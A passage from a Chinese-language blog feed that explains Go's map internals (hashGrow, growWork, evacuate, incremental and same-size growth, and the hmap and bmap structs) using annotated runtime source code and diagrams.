makemap时定一个随机的哈希种子，所以要构造这种冲突是没那么容易的。</p><p>在源码中，和扩容相关的主要是<code>hashGrow()</code>函数与<code>growWork()</code>函数。<code>hashGrow()</code> 函数实际上并没有真正地“搬迁”，它只是分配好了新的 buckets，并将老的 buckets 挂到了 oldbuckets 字段上。真正搬迁 buckets 的动作在 <code>growWork()</code> 函数中，而调用 <code>growWork()</code> 函数的动作是在<code>mapassign()</code> 和 <code>mapdelete()</code> 函数中。也就是插入（包括修改）、删除 key 的时候，都会尝试进行搬迁 buckets 的工作。它们会先检查 oldbuckets 是否搬迁完毕（检查 oldbuckets 是否为 nil），再决定是否进行搬迁工作。</p><p><code>hashGrow()</code>函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hashGrow</span><span class="hljs-params">(t *maptype, h *hmap)</span></span> &#123;<br>  <span class="hljs-comment">// 如果达到条件 1，那么将B值加1，相当于是原来的2倍</span><br>  <span class="hljs-comment">// 否则对应条件 2，进行等量扩容，所以 B 不变</span><br>    bigger := <span class="hljs-type">uint8</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> !overLoadFactor(h.count+<span class="hljs-number">1</span>, h.B) &#123;<br>        bigger = <span class="hljs-number">0</span><br>        h.flags |= sameSizeGrow<br>    &#125;<br>  <span class="hljs-comment">// 记录老的buckets</span><br>    oldbuckets := h.buckets<br>  <span class="hljs-comment">// 申请新的buckets空间</span><br>    newbuckets, nextOverflow := makeBucketArray(t, h.B+bigger, <span class="hljs-literal">nil</span>)<br>  <span class="hljs-comment">// 注意&amp;^ 运算符，这块代码的逻辑是转移标志位</span><br>    flags := h.flags &amp;^ (iterator | oldIterator)<br>    <span class="hljs-keyword">if</span> h.flags&amp;iterator != <span class="hljs-number">0</span> &#123;<br>        flags |= oldIterator<br>    &#125;<br>    <span class="hljs-comment">// 提交grow (atomic wrt gc)</span><br>    h.B += bigger<br>    h.flags = flags<br>    h.oldbuckets = oldbuckets<br>    h.buckets = newbuckets<br>  <span class="hljs-comment">// 搬迁进度为0</span><br>    h.nevacuate = <span class="hljs-number">0</span><br>  <span class="hljs-comment">// overflow buckets 数为0</span><br>    h.noverflow = <span class="hljs-number">0</span><br><br>  <span class="hljs-comment">// 如果发现hmap是通过extra字段 来存储 overflow buckets时</span><br>    <span class="hljs-keyword">if</span> h.extra != <span class="hljs-literal">nil</span> &amp;&amp; h.extra.overflow != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">if</span> h.extra.oldoverflow != <span class="hljs-literal">nil</span> &#123;<br>            throw(<span class="hljs-string">&quot;oldoverflow is not nil&quot;</span>)<br>        &#125;<br>        h.extra.oldoverflow = h.extra.overflow<br>        h.extra.overflow = <span class="hljs-literal">nil</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> nextOverflow != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">if</span> h.extra == <span class="hljs-literal">nil</span> &#123;<br>            h.extra = <span class="hljs-built_in">new</span>(mapextra)<br>        &#125;<br>        h.extra.nextOverflow = nextOverflow<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>growWork()</code>函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">growWork</span><span class="hljs-params">(t *maptype, h *hmap, bucket <span class="hljs-type">uintptr</span>)</span></span> &#123;<br>  <span class="hljs-comment">// 为了确认搬迁的 bucket 是我们正在使用的 bucket</span><br>  <span class="hljs-comment">// 即如果当前key映射到老的bucket1，那么就搬迁该bucket1。</span><br>    evacuate(t, h, bucket&amp;h.oldbucketmask())<br><br>    <span class="hljs-comment">// 如果还未完成扩容工作，则再搬迁一个bucket。</span><br>    <span class="hljs-keyword">if</span> h.growing() &#123;<br>        evacuate(t, h, h.nevacuate)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从<code>growWork()</code>函数可以知道，搬迁的核心逻辑是<code>evacuate()</code>函数。这里读者可以思考一个问题：为什么每次至多搬迁2个bucket？这其实是一种性能考量，如果map存储了数以亿计的key-value，一次性搬迁将会造成比较大的延时，因此才采用逐步搬迁策略。</p><p>在讲解该逻辑之前，需要读者先理解以下两个知识点。</p><ul><li>知识点1：bucket序号的变化</li></ul><p>前面讲到，增量扩容（条件1）和等量扩容（条件2）都需要进行bucket的搬迁工作。对于等量扩容而言，由于buckets的数量不变，因此可以按照序号来搬迁。例如老的的0号bucket，仍然搬至新的0号bucket中。</p><p><img src="https://pic4.zhimg.com/80/v2-9d60c8b3096e2dab7a87c64bf349097b_1440w.webp" alt="img"></p><p>但是，对于增量扩容而言，就会有所不同。例如原来的B&#x3D;5，那么增量扩容时，B就会变成6。那么决定key值落入哪个bucket的低位哈希值就会发生变化（从取5位变为取6位），取新的低位hash值得过程称为rehash。</p><p><img src="https://pic4.zhimg.com/80/v2-15b4f455a970e9d3406cd47765bcca8b_1440w.webp" alt="img"></p><p>因此，在增量扩容中，某个 key 在搬迁前后 bucket 序号可能和原来相等，也可能是相比原来加上 2^B（原来的 B 值），取决于低 hash 值第倒数第B+1位是 0 还是 1。</p><p><img src="https://pic2.zhimg.com/80/v2-c50f4e8f7e2769313b4f2d680fa91925_1440w.webp" alt="img"></p><p>如上图所示，当原始的B &#x3D; 3时，旧buckets数组长度为8，在编号为2的bucket中，其2号cell和5号cell，它们的低3位哈希值相同（不相同的话，也就不会落在同一个桶中了），但是它们的低4位分别是0010、1010。当发生了增量扩容，2号就会被搬迁到新buckets数组的2号bucket中去，5号被搬迁到新buckets数组的10号bucket中去，它们的桶号差距是2的3次方。</p><ul><li>知识点2：确定搬迁区间</li></ul><p>在源码中，有bucket x 和bucket y的概念，其实就是增量扩容到原来的 2 倍，桶的数量是原来的 2 倍，前一半桶被称为bucket x，后一半桶被称为bucket y。一个 bucket 中的 key 可能会分裂到两个桶中去，分别位于bucket x的桶，或bucket y中的桶。所以在搬迁一个 cell 之前，需要知道这个 cell 中的 key 是落到哪个区间（而对于同一个桶而言，搬迁到bucket x和bucket y桶序号的差别是老的buckets大小，即2^old_B）。</p><p>这里留一个问题：为什么确定key落在哪个区间很重要？</p><p><img src="https://pic1.zhimg.com/80/v2-197a831e09d60dd04566163be0458b5c_1440w.webp" alt="img"></p><p>确定了要搬迁到的目标 bucket 后，搬迁操作就比较好进行了。将源 key&#x2F;value 值 copy 到目的地相应的位置。设置 key 在原始 buckets 的 tophash 为 <code>evacuatedX</code> 或是 <code>evacuatedY</code>，表示已经搬迁到了新 map 的bucket x或是bucket y，新 map 的 tophash 则正常取 key 哈希值的高 8 位。</p><p>下面正式解读搬迁核心代码<code>evacuate()</code>函数。</p><p><code>evacuate()</code>函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">evacuate</span><span class="hljs-params">(t *maptype, h *hmap, oldbucket <span class="hljs-type">uintptr</span>)</span></span> &#123;<br>  <span class="hljs-comment">// 首先定位老的bucket的地址</span><br>    b := (*bmap)(add(h.oldbuckets, oldbucket*<span class="hljs-type">uintptr</span>(t.bucketsize)))<br>  <span class="hljs-comment">// newbit代表扩容之前老的bucket个数</span><br>    newbit := h.noldbuckets()<br>  <span class="hljs-comment">// 判断该bucket是否已经被搬迁</span><br>    <span class="hljs-keyword">if</span> !evacuated(b) &#123;<br>    <span class="hljs-comment">// 官方TODO，后续版本也许会实现</span><br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> reuse overflow buckets instead of using new ones, if there</span><br>        <span class="hljs-comment">// is no iterator using the old buckets.  (If !oldIterator.)</span><br><br>    <span class="hljs-comment">// xy 包含了高低区间的搬迁目的地内存信息</span><br>    <span class="hljs-comment">// x.b 是对应的搬迁目的桶</span><br>    <span class="hljs-comment">// x.k 是指向对应目的桶中存储当前key的内存地址</span><br>    <span class="hljs-comment">// x.e 是指向对应目的桶中存储当前value的内存地址</span><br>        <span class="hljs-keyword">var</span> xy [<span class="hljs-number">2</span>]evacDst<br>        x := &amp;xy[<span class="hljs-number">0</span>]<br>        x.b = (*bmap)(add(h.buckets, oldbucket*<span class="hljs-type">uintptr</span>(t.bucketsize)))<br>        x.k = add(unsafe.Pointer(x.b), dataOffset)<br>        x.e = add(x.k, bucketCnt*<span class="hljs-type">uintptr</span>(t.keysize))<br><br>    <span class="hljs-comment">// 只有当增量扩容时才计算bucket y的相关信息（和后续计算useY相呼应）</span><br>        <span class="hljs-keyword">if</span> !h.sameSizeGrow() &#123;<br>            y := &amp;xy[<span class="hljs-number">1</span>]<br>            y.b = (*bmap)(add(h.buckets, (oldbucket+newbit)*<span class="hljs-type">uintptr</span>(t.bucketsize)))<br>            y.k = add(unsafe.Pointer(y.b), dataOffset)<br>            y.e = add(y.k, bucketCnt*<span class="hljs-type">uintptr</span>(t.keysize))<br>        &#125;<br><br>    <span class="hljs-comment">// evacuate 函数每次只完成一个 bucket 的搬迁工作，因此要遍历完此 bucket 的所有的 cell，将有值的 cell copy 到新的地方。</span><br>    <span class="hljs-comment">// bucket 还会链接 overflow bucket，它们同样需要搬迁。</span><br>    <span class="hljs-comment">// 因此同样会有 2 层循环，外层遍历 bucket 和 overflow bucket，内层遍历 bucket 的所有 cell。</span><br><br>    <span class="hljs-comment">// 遍历当前桶bucket和其之后的溢出桶overflow bucket</span><br>    <span class="hljs-comment">// 注意：初始的b是待搬迁的老bucket</span><br>        <span class="hljs-keyword">for</span> ; b != <span class="hljs-literal">nil</span>; b = b.overflow(t) &#123;<br>            k := add(unsafe.Pointer(b), dataOffset)<br>            e := add(k, bucketCnt*<span class="hljs-type">uintptr</span>(t.keysize))<br>      <span class="hljs-comment">// 遍历桶中的cell，i，k，e分别用于对应tophash，key和value</span><br>            <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; bucketCnt; i, k, e = i+<span class="hljs-number">1</span>, add(k, <span class="hljs-type">uintptr</span>(t.keysize)), add(e, <span class="hljs-type">uintptr</span>(t.elemsize)) &#123;<br>                top := b.tophash[i]<br>        <span class="hljs-comment">// 如果当前cell的tophash值是emptyOne或者emptyRest，则代表此cell没有key。并将其标记为evacuatedEmpty，表示它“已经被搬迁”。</span><br>                <span class="hljs-keyword">if</span> isEmpty(top) &#123;<br>                    b.tophash[i] = evacuatedEmpty<br>                    <span class="hljs-keyword">continue</span><br>                &#125;<br>        <span class="hljs-comment">// 正常不会出现这种情况</span><br>        <span class="hljs-comment">// 未被搬迁的 cell 只可能是emptyOne、emptyRest或是正常的 top hash（大于等于 minTopHash）</span><br>                <span class="hljs-keyword">if</span> top &lt; minTopHash &#123;<br>                    throw(<span class="hljs-string">&quot;bad map state&quot;</span>)<br>                &#125;<br>                k2 := k<br>        <span class="hljs-comment">// 如果 key 是指针，则解引用</span><br>                <span class="hljs-keyword">if</span> t.indirectkey() &#123;<br>                    k2 = *((*unsafe.Pointer)(k2))<br>                &#125;<br>                <span class="hljs-keyword">var</span> useY <span class="hljs-type">uint8</span><br>        <span class="hljs-comment">// 如果是增量扩容</span><br>                <span class="hljs-keyword">if</span> !h.sameSizeGrow() &#123;<br>          <span class="hljs-comment">// 计算哈希值，判断当前key和vale是要被搬迁到bucket x还是bucket y</span><br>                    hash := t.hasher(k2, <span class="hljs-type">uintptr</span>(h.hash0))<br>                    <span class="hljs-keyword">if</span> h.flags&amp;iterator != <span class="hljs-number">0</span> &amp;&amp; !t.reflexivekey() &amp;&amp; !t.key.equal(k2, k2) &#123;<br>            <span class="hljs-comment">// 有一个特殊情况：有一种 key，每次对它计算 hash，得到的结果都不一样。</span><br>            <span class="hljs-comment">// 这个 key 就是 math.NaN() 的结果，它的含义是 not a number，类型是 float64。</span><br>            <span class="hljs-comment">// 当它作为 map 的 key时，会遇到一个问题：再次计算它的哈希值和它当初插入 map 时的计算出来的哈希值不一样！</span><br>            <span class="hljs-comment">// 这个 key 是永远不会被 Get 操作获取的！当使用 m[math.NaN()] 语句的时候，是查不出来结果的。</span><br>            <span class="hljs-comment">// 这个 key 只有在遍历整个 map 的时候，才能被找到。</span><br>            <span class="hljs-comment">// 并且，可以向一个 map 插入多个数量的 math.NaN() 作为 key，它们并不会被互相覆盖。</span><br>            <span class="hljs-comment">// 当搬迁碰到 math.NaN() 的 key 时，只通过 tophash 的最低位决定分配到 X part 还是 Y part（如果扩容后是原来 buckets 数量的 2 倍）。如果 tophash 的最低位是 0 ，分配到 X part；如果是 1 ，则分配到 Y part。</span><br>                        useY = top &amp; <span class="hljs-number">1</span><br>                        top = tophash(hash)<br>          <span class="hljs-comment">// 对于正常key，进入以下else逻辑  </span><br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> hash&amp;newbit != <span class="hljs-number">0</span> &#123;<br>                            useY = <span class="hljs-number">1</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> evacuatedX+<span class="hljs-number">1</span> != evacuatedY || evacuatedX^<span class="hljs-number">1</span> != evacuatedY &#123;<br>                    throw(<span class="hljs-string">&quot;bad evacuatedN&quot;</span>)<br>                &#125;<br><br>        <span class="hljs-comment">// evacuatedX + 1 == evacuatedY</span><br>                b.tophash[i] = evacuatedX + useY<br>        <span class="hljs-comment">// useY要么为0，要么为1。这里就是选取在bucket x的起始内存位置，或者选择在bucket y的起始内存位置（只有增量同步才会有这个选择可能）。</span><br>                dst := &amp;xy[useY]<br><br>        <span class="hljs-comment">// 如果目的地的桶已经装满了（8个cell），那么需要新建一个溢出桶，继续搬迁到溢出桶上去。</span><br>                <span class="hljs-keyword">if</span> dst.i == bucketCnt &#123;<br>                    dst.b = h.newoverflow(t, dst.b)<br>                    dst.i = <span class="hljs-number">0</span><br>                    dst.k = add(unsafe.Pointer(dst.b), dataOffset)<br>                    dst.e = add(dst.k, bucketCnt*<span class="hljs-type">uintptr</span>(t.keysize))<br>                &#125;<br>                dst.b.tophash[dst.i&amp;(bucketCnt<span class="hljs-number">-1</span>)] = top<br>        <span class="hljs-comment">// 如果待搬迁的key是指针，则复制指针过去</span><br>                <span class="hljs-keyword">if</span> t.indirectkey() &#123;<br>                    *(*unsafe.Pointer)(dst.k) = k2 <span class="hljs-comment">// copy pointer</span><br>        <span class="hljs-comment">// 如果待搬迁的key是值，则复制值过去  </span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    typedmemmove(t.key, dst.k, k) <span class="hljs-comment">// copy elem</span><br>                &#125;<br>        <span class="hljs-comment">// value和key同理</span><br>                <span class="hljs-keyword">if</span> t.indirectelem() &#123;<br>                    *(*unsafe.Pointer)(dst.e) = *(*unsafe.Pointer)(e)<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    typedmemmove(t.elem, dst.e, e)<br>                &#125;<br>        <span class="hljs-comment">// 将当前搬迁目的桶的记录key/value的索引值（也可以理解为cell的索引值）加一</span><br>                dst.i++<br>        <span class="hljs-comment">// 由于桶的内存布局中在最后还有overflow的指针，多以这里不用担心更新有可能会超出key和value数组的指针地址。</span><br>                dst.k = add(dst.k, <span class="hljs-type">uintptr</span>(t.keysize))<br>                dst.e = add(dst.e, <span class="hljs-type">uintptr</span>(t.elemsize))<br>            &#125;<br>        &#125;<br>    <span class="hljs-comment">// 如果没有协程在使用老的桶，就对老的桶进行清理，用于帮助gc</span><br>        <span class="hljs-keyword">if</span> h.flags&amp;oldIterator == <span class="hljs-number">0</span> &amp;&amp; t.bucket.ptrdata != <span class="hljs-number">0</span> &#123;<br>            b := add(h.oldbuckets, oldbucket*<span class="hljs-type">uintptr</span>(t.bucketsize))<br>      <span class="hljs-comment">// 只清除bucket 的 key,value 部分，保留 top hash 部分，指示搬迁状态</span><br>            ptr := add(b, dataOffset)<br>            n := <span class="hljs-type">uintptr</span>(t.bucketsize) - dataOffset<br>            memclrHasPointers(ptr, n)<br>        &#125;<br>    &#125;<br><br>  <span class="hljs-comment">// 用于更新搬迁进度</span><br>    <span class="hljs-keyword">if</span> oldbucket == h.nevacuate &#123;<br>        advanceEvacuationMark(h, t, newbit)<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">advanceEvacuationMark</span><span class="hljs-params">(h *hmap, t *maptype, newbit <span class="hljs-type">uintptr</span>)</span></span> &#123;<br>  <span class="hljs-comment">// 搬迁桶的进度加一</span><br>    h.nevacuate++<br>  <span class="hljs-comment">// 实验表明，1024至少会比newbit高出一个数量级（newbit代表扩容之前老的bucket个数）。所以，用当前进度加上1024用于确保O(1)行为。</span><br>    stop := h.nevacuate + <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">if</span> stop &gt; newbit &#123;<br>        stop = newbit<br>    &#125;<br>  <span class="hljs-comment">// 计算已经搬迁完的桶数</span><br>    <span class="hljs-keyword">for</span> h.nevacuate != stop &amp;&amp; bucketEvacuated(t, h, h.nevacuate) &#123;<br>        h.nevacuate++<br>    &#125;<br>  <span class="hljs-comment">// 如果h.nevacuate == newbit，则代表所有的桶都已经搬迁完毕</span><br>    <span class="hljs-keyword">if</span> h.nevacuate == newbit &#123;<br>    <span class="hljs-comment">// 搬迁完毕，所以指向老的buckets的指针置为nil</span><br>        h.oldbuckets = <span class="hljs-literal">nil</span><br>    <span class="hljs-comment">// 在讲解hmap的结构中，有过说明。如果key和value均不包含指针，则都可以inline。</span><br>    <span class="hljs-comment">// 那么保存它们的buckets数组其实是挂在hmap.extra中的。所以，这种情况下，其实我们是搬迁的extra的buckets数组。</span><br>    <span class="hljs-comment">// 因此，在这种情况下，需要在搬迁完毕后，将hmap.extra.oldoverflow指针置为nil。</span><br>        <span class="hljs-keyword">if</span> h.extra != <span class="hljs-literal">nil</span> &#123;<br>            h.extra.oldoverflow = <span class="hljs-literal">nil</span><br>        &#125;<br>    <span class="hljs-comment">// 最后，清除正在扩容的标志位，扩容完毕。</span><br>        h.flags &amp;^= sameSizeGrow<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码比较长，但是文中注释已经比较清晰了，如果对map的扩容还不清楚，可以参见以下图解。</p><p><img src="https://pic2.zhimg.com/80/v2-3df0b0907c1a309a58c7d40d0fc41a59_1440w.webp" alt="img"></p><p>针对上图的map，其B为3，所以原始buckets数组为8。当map元素数变多，加载因子超过6.5，所以引起了增量扩容。</p><p>以3号bucket为例，可以看到，由于B值加1，所以在新选取桶时，需要取低4位哈希值，这样就会造成cell会被搬迁到新buckets数组中不同的桶（3号或11号桶）中去。注意，在一个桶中，搬迁cell的工作是有序的：它们是依序填进对应新桶的cell中去的。</p><p>当然，实际情况中3号桶很可能还有溢出桶，在这里为了简化绘图，假设3号桶没有溢出桶，如果有溢出桶，则相应地添加到新的3号桶和11号桶中即可，如果对应的3号和11号桶均装满，则给新的桶添加溢出桶来装载。</p><p><img src="https://pic2.zhimg.com/80/v2-47aafdcac1db08845444e14f55adb3a5_1440w.webp" alt="img"></p><p>对于上图的map，其B也为3。假设整个map中的overflow过多，触发了等量扩容。注意，等量扩容时，新的buckets数组大小和旧buckets数组是一样的。</p><p>以6号桶为例，它有一个bucket和3个overflow buckets，但是我们能够发现桶里的数据非常稀疏，等量扩容的目的就是为了把松散的键值对重新排列一次，以使bucket的使用率更高，进而保证更快的存取。搬迁完毕后，新的6号桶中只有一个基础bucket，暂时并不需要溢出桶。这样，和原6号桶相比，数据变得紧密，使后续的数据存取变快。</p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang中map的实现原理</title>
    <link href="/2022/12/14/Golang%E4%B8%ADmap%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
    <url>/2022/12/14/Golang%E4%B8%ADmap%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang中map的实现原理"><a href="#Golang中map的实现原理" class="headerlink" title="Golang中map的实现原理"></a>Golang中map的实现原理</h1><h2 id="什么是map？"><a href="#什么是map？" class="headerlink" title="什么是map？"></a>什么是map？</h2><p>map 的设计也被称为 “The dictionary problem”，它的任务是设计一种数据结构用来维护一个集合的数据，并且可以同时对集合进行增删查改的操作。最主要的数据结构有两种：<code>哈希查找表（Hash table）</code>、<code>搜索树（Search tree）</code>。</p><p>哈希查找表用一个哈希函数将 key 分配到不同的桶（bucket，也就是数组的不同 index）。这样，开销主要在哈希函数的计算以及数组的常数访问时间。在很多场景下，哈希查找表的性能很高。</p><p>哈希查找表一般会存在“碰撞”的问题，就是说不同的 key 被哈希到了同一个 bucket。一般的应对方法如下：</p><ul><li>开放定址法</li></ul><blockquote><p>当冲突发生时，使用某种探查(亦称探测)技术在散列表中形成一个探查(测)序列。</p><p>沿此序列逐个单元地查找，直到找到给定 的关键字，或者碰到一个开放的地址(即该地址单元为空)为止（若要插入，在探查到开放的地址，则可将待插入的新结点存人该地址单元）。</p><p>查找时探查到开放的 地址则表明表中无待查的关键字，即查找失败。</p></blockquote><ul><li>再哈希法</li></ul><blockquote><p>同时构造多个不同的哈希函数。</p></blockquote><ul><li>链地址法（链表法）</li></ul><blockquote><p>将所有哈希地址为i的元素构成一个称为同义词链的单链表，并将单链表的头指针存在哈希表的第 i 个单元中</p><p>因而查找、插入和删除主要在同义词链中进行。链地址法适用于经常进行插入和删除的情况。</p></blockquote><ul><li>建立公共溢出区</li></ul><blockquote><p>将哈希表分为基本表和溢出表两部分，凡是和基本表发生冲突的元素，一律填入溢出表。</p></blockquote><h2 id="go中-map-的底层如何实现"><a href="#go中-map-的底层如何实现" class="headerlink" title="go中 map 的底层如何实现"></a>go中 map 的底层如何实现</h2><p><strong>Go 语言采用的是哈希查找表，并且使用链表法解决哈希冲突。</strong></p><p>源码中 Go map 的结构体如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// A header for a Go map.`hmap` 是 hashmap 的缩写：</span><br><span class="hljs-keyword">type</span> hmap <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// Make sure this stays in sync with the compiler&#x27;s definition.</span><br>    count     <span class="hljs-type">int</span>       <span class="hljs-comment">// 元素数量，调用 len(map) 时，直接返回这个值</span><br>    flags     <span class="hljs-type">uint8</span>     <span class="hljs-comment">// 状态标志</span><br>    B         <span class="hljs-type">uint8</span>     <span class="hljs-comment">// log_2 of # of buckets (can hold up to loadFactor * 2^B items)</span><br>    noverflow <span class="hljs-type">uint16</span> <span class="hljs-comment">// approximate number of overflow buckets; see incrnoverflow for details</span><br>    hash0     <span class="hljs-type">uint32</span> <span class="hljs-comment">// 哈希 随机数种子</span><br><br>    buckets    unsafe.Pointer <span class="hljs-comment">// array of 2^B Buckets. may be nil if count==0.</span><br>    oldbuckets unsafe.Pointer <span class="hljs-comment">// previous bucket array of half the size, non-nil only when growing</span><br>    nevacuate  <span class="hljs-type">uintptr</span>        <span class="hljs-comment">// progress counter for evacuation (buckets less than this have been evacuated)</span><br><br>    extra *mapextra <span class="hljs-comment">// optional fields</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>count</strong> 代表 map 中元素的数量</li><li><strong>flags</strong> 代表当前 map 的状态（是否处于正在写入的状态等）</li><li>2 的 <strong>B</strong> 次幂表示当前 map 中桶的数量，2^B &#x3D; Buckets size</li><li><strong>noverflow</strong> 为 map 中溢出桶的数量。当溢出的桶太多时，map 会进行 same-size map growth，其实质是避免桶过大导致内存泄露。</li><li><strong>hash0</strong> 代表生成 hash 的随机数种子</li><li><strong>buckets</strong> 是指向当前 map 对应的桶的指针。</li><li><strong>oldbuckets</strong> 是在 map 扩容时存储旧桶的，当所有旧桶中的数据都已经转移到了新桶中时，则清空。</li><li><strong>nevacuate</strong> 在扩容时使用，用于标记当前旧桶中小于 nevacuate 的数据都已经转移到了新桶中。</li><li><strong>extra</strong> 存储 map 中的溢出桶。</li></ul><p>其中buckets 是一个指针，最终它指向的是一个bmap结构体：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// A bucket for a Go map.</span><br><span class="hljs-keyword">type</span> bmap <span class="hljs-keyword">struct</span> &#123;<br>    tophash [bucketCnt]<span class="hljs-type">uint8</span><br>&#125;<br></code></pre></td></tr></table></figure><p>tophash 通常包含此 buckets 